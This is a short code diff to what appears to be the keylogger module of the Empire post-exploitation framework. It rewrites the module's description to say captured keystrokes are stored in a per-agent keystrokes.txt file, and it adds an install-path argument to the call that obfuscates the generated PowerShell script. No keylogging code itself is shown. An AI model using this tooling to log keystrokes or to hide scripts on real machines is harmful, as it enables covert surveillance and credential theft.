@@ -9,7 +9,7 @@ class Module:
 
             'Author': ['@obscuresec', '@mattifestation', '@harmj0y'],
 
-            'Description': ('Logs keys pressed, time and the active window (when changed).'),
+            'Description': ('Logs keys pressed, time and the active window (when changed) to the keystrokes.txt file. This file is located in the agents downloads directory Empire/downloads/<AgentName>/keystrokes.txt.'),
 
             'Background' : True,
 
@@ -77,6 +77,6 @@ class Module:
                     else:
                         scriptEnd += " -" + str(option) + " " + str(values['Value'])
         if obfuscate:
-            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
         return script
